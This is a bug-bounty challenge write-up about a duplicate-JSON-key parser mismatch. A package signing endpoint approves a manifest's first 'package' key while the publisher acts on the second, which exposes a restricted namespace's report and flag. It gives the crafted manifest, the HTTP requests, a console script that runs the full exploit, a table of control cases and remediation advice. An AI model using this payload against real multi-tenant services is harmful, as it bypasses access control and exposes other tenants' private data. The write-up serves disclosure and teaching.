# intigriti 0726 duplicate key json

|              |                                                       |
| ------------ | ----------------------------------------------------- |
| Program      | Intigriti Challenge 0726                              |
| Code         | INTIGRITI-W10RNNAA                                    |
| Asset        | `https://challenge-0726.intigriti.io` (Tier 2)        |
| Component    | `POST /api/manifests/sign` → `POST /api/publications` |
| Type         | Improper Access Control (Generic)                     |
| Severity     | Medium                                                |
| Status       | Accepted                                              |
| Created      | 27/07/2026                                            |
| Last updated | 01/08/2026                                            |

## Summary

Any registered user can get a valid signed approval for the restricted `core` namespace and use it to read `@core/security-notes` v1.0.0, the protected report holding the flag.

The signing pipeline splits the authorization check from the action:

{% stepper %}
{% step %}
### Sign the manifest

`POST /api/manifests/sign` parses the manifest, checks that `package.scope` belongs to the caller, and signs `sha256(raw manifest bytes)`.
{% endstep %}

{% step %}
### Publish the manifest

`POST /api/publications` verifies that signature, parses the same bytes again, and builds the report from whatever scope it reads.
{% endstep %}
{% endstepper %}

The two stages handle duplicate JSON keys differently. Give the manifest two top-level `"package"` keys and the signer takes the first while the publisher takes the last. One unmodified byte string then means "my namespace" to the check and `core` to the report generator.

The digest itself is solid. I signed an honest manifest, swapped in the core body before publishing, and got back `400 "Publication approval is invalid."` Nothing here forges or tampers with a signature. Every check passes for real. The two halves just answer different questions about the same document.

## Steps to reproduce

### Environment

* Attacker: freshly registered account `touhemi-zx91k4`, namespace `@touhemi-zx91k4-9b9ffe17`. No special role, no elevated permission.
* Target: `@core/security-notes` v1.0.0, found via `/api/observatory/advisories`, `/catalog` and `/references`.
* Tested: 27/07/2026

{% hint style="info" %}
Step 2 uses `hello-world` because every new namespace is seeded with `compat-sample`, `hello-world` and `legacy-adapter`.

The approval expires in about 15 minutes, counted down in Manifest Studio. Publish before it lapses, or step 4 fails on expiry instead.
{% endhint %}

{% stepper %}
{% step %}
## Control: asking for the restricted scope directly is refused

Manifest:

```json
{"package":{"scope":"core","name":"security-notes","version":"1.0.0"},"metadata":{"description":"x","visibility":"private"},"operation":"preflight"}
```

Request:

```http
POST /api/manifests/sign HTTP/1.1
Host: challenge-0726.intigriti.io
Content-Type: application/json
X-CSRF-Token: <token from GET /api/me>
Cookie: <session>

{"manifest_b64":"<base64 of the manifest above>"}
```

Response: `400 {"error":"Manifest could not be approved."}`
{% endstep %}

{% step %}
## Build the dual-reading manifest

Two `"package"` keys, own namespace first and `core` second. Exact bytes, single line, no whitespace between tokens:

```json
{"package":{"scope":"touhemi-zx91k4-9b9ffe17","name":"hello-world","version":"1.0.0"},"package":{"scope":"core","name":"security-notes","version":"1.0.0"},"metadata":{"description":"x","visibility":"private"},"operation":"preflight"}
```

The `sha256` of the decoded bytes is `8f94c0a774cfaa922f18039b6a0c56b918e6129c189fb2c605739b3d34808d11`. That matches the `manifest_sha256` returned in the next step and the digest shown in the screenshot, so you can confirm nothing was altered between signing and publishing:

```bash
echo '<base64 above>' | base64 -d | sha256sum
```
{% endstep %}

{% step %}
## Sign it

Same endpoint as step 1, with the base64 of the manifest above.

```json
201 {"approval_id":"d57f048a-7875-4dd0-b93f-81e0cff5b6b5",
     "manifest_sha256":"8f94c0a774cfaa922f18039b6a0c56b918e6129c189fb2c605739b3d34808d11",
     "nonce":"oGSyx-5ZwP_RCfSmw0Z8xFWKb7KgCddVzLoRUH0MF88",
     "expires_at":1785153534,
     "signature":"nIXV+D/hzEcZ1BcbXwpMd4f+4pWszq8frsqFzVG8pBxM6zOs0uy0UpdKBUEfgVVHZJPVS8e0fTG1b4fOwk6wBQ=="}
```

The signer read key #1, my own scope, and approved.
{% endstep %}

{% step %}
## Publish the identical bytes

Nothing modified between signing and publishing.

```http
POST /api/publications HTTP/1.1
Host: challenge-0726.intigriti.io
Content-Type: application/json
X-CSRF-Token: <token>
Cookie: <session>

{"manifest_b64":"<same base64 as step 2>",
 "approval_id":"d57f048a-7875-4dd0-b93f-81e0cff5b6b5",
 "manifest_sha256":"8f94c0a774cfaa922f18039b6a0c56b918e6129c189fb2c605739b3d34808d11",
 "nonce":"oGSyx-5ZwP_RCfSmw0Z8xFWKb7KgCddVzLoRUH0MF88",
 "expires_at":1785153534,
 "signature":"nIXV+D/hzEcZ1BcbXwpMd4f+4pWszq8frsqFzVG8pBxM6zOs0uy0UpdKBUEfgVVHZJPVS8e0fTG1b4fOwk6wBQ=="}
```

Response: `201 {"publication_id":"db72ec7c-35b9-43fb-b71d-e865361b5e8b","status":"ready"}`

The digest verifies, then the publisher reads key #2.
{% endstep %}

{% step %}
## Read the report

```http
GET /api/publications/db72ec7c-35b9-43fb-b71d-e865361b5e8b
```

```json
{"target":"@core/security-notes","version":"1.0.0","status":"ready",
 "report":{"target":"@core/security-notes",
           "release_notes":"INTIGRITI{019f8700-4613-74fb-923e-781903e4bee9}",
           "latest_version":"1.0.0","package_exists":true}}
```

**Expected:** 400 at step 3. The caller does not own the `core` scope.\
**Actual:** 201, and the restricted report comes back at this step.

The report also renders in the normal UI under **Publication history > View**. See the attached screenshot.
{% endstep %}
{% endstepper %}

## Flag

```
INTIGRITI{019f8700-4613-74fb-923e-781903e4bee9}
```

## Payload

The whole exploit is the two `"package"` keys:

```json
{"package":{"scope":"<YOUR-NAMESPACE>","name":"hello-world","version":"1.0.0"},"package":{"scope":"core","name":"security-notes","version":"1.0.0"},"metadata":{"description":"x","visibility":"private"},"operation":"preflight"}
```

Full reproduction from a fresh account. Register, then paste this into the DevTools console on `https://challenge-0726.intigriti.io`:

```js
(async () => {
  const enc = new TextEncoder();
  const b64 = s => btoa(String.fromCharCode(...enc.encode(s)));
  const me  = await (await fetch('/api/me', {credentials:'same-origin'})).json();
  const ns = me.user.namespace, csrf = me.csrf_token;
  const post = (p, b) => fetch('/api' + p, {
    method: 'POST', credentials: 'same-origin',
    headers: {'content-type':'application/json', 'x-csrf-token': csrf},
    body: JSON.stringify(b)
  }).then(r => r.json());

  // key #1 = my namespace (signer reads this)
  // key #2 = core          (publisher reads this)
  const manifest =
    `{"package":{"scope":"${ns}","name":"hello-world","version":"1.0.0"},` +
    `"package":{"scope":"core","name":"security-notes","version":"1.0.0"},` +
    `"metadata":{"description":"x","visibility":"private"},"operation":"preflight"}`;

  const a = await post('/manifests/sign', {manifest_b64: b64(manifest)});
  const p = await post('/publications', {
    manifest_b64: b64(manifest),
    approval_id: a.approval_id, manifest_sha256: a.manifest_sha256,
    nonce: a.nonce, expires_at: a.expires_at, signature: a.signature
  });
  const r = await (await fetch('/api/publications/' + p.publication_id,
                               {credentials:'same-origin'})).json();
  console.log(r.target, r.report.release_notes);
})();
```

{% hint style="info" %}
The digest changes with the namespace, since key #1 carries your own namespace string. A different digest on your reproduction does not indicate a failed run.
{% endhint %}

## Control cases confirming the root cause

| Manifest sent to `/manifests/sign`                        | Result                  |
| --------------------------------------------------------- | ----------------------- |
| plain, own scope                                          | 201 (harness works)     |
| plain, `scope:"core"`                                     | 400 (scope check works) |
| duplicate `package`, own first, core second               | 201                     |
| duplicate `package`, core first, own second               | 400                     |
| `"core"` (unicode-escaped core)                           | 400                     |
| own manifest signed, then core body swapped in at publish | 400, approval invalid   |

Rows 3 and 4 are the finding. Same structure, only the key order differs, opposite results. A filter that simply missed `core` would let both orders through, so only a first-key-wins parser explains this. Row 5 shows the check runs on decoded values rather than raw text. Row 6 shows the digest binding is intact.

## Impact

Anyone who registers a free account can read a report from the restricted `core` namespace. The app clearly means to withhold it, since asking for that scope directly returns a 400. In this instance the report holds the flag, `INTIGRITI{019f8700-4613-74fb-923e-781903e4bee9}`.

The namespace boundary is what keeps tenants apart. Approvals get issued for one scope and honoured as another, so that boundary fails for any private namespace on the instance, not just `core`. The scope in the second `"package"` key is entirely attacker-chosen.

What it takes: one free account, no victim interaction, no elevated role, no race or timing window, two requests.

Registry data is untouched, so this is a confidentiality issue only.

Worth noting for detection. Each publication is created under the attacker's own approval and appears in their own history, so nothing about the traffic looks different from normal use.

## Recommended solution

Parse the manifest once. Derive both the authorization decision and the report target from that single parsed object, instead of letting two components read the same bytes independently.

Reject manifests with duplicate keys rather than quietly resolving them. Either parse strictly, or canonicalize with RFC 8785 (JCS) and sign the canonical form. RFC 8259 leaves duplicate-key behaviour undefined, so any design that depends on two parsers agreeing about it will break sooner or later.

Defence in depth: re-check scope ownership against the session at `/api/publications`, so a mis-issued approval on its own is not enough to read another namespace's data.
